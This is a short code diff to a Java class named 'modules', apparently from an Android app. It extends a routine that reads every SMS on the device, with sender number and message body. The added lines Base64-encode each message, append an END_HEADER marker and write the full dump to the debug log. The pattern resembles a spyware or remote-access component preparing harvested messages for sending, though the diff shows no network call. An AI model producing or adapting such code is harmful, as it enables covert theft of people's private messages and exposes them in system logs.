@@ -89,10 +89,14 @@ public class modules {
         while ( messagesCursor != null && messagesCursor.moveToNext()) {
             String number = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.ADDRESS));
             String body = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.BODY));
-            allMessages.append("\n Number: ").append(number);
-            allMessages.append("\n Body: ").append(body);
+            allMessages.append(Base64.encodeToString(number.getBytes(), Base64.DEFAULT));
+            allMessages.append(Base64.encodeToString(" : ".getBytes(), Base64.DEFAULT));
+            allMessages.append(Base64.encodeToString(body.getBytes(), Base64.DEFAULT));
+            allMessages.append(Base64.encodeToString("\n".getBytes(), Base64.DEFAULT));
         }
         messagesCursor.close();
+        allMessages.append(END_HEADER);
+        Log.d("Messages", allMessages.toString());
         return allMessages.toString() + "\n";
     }
 
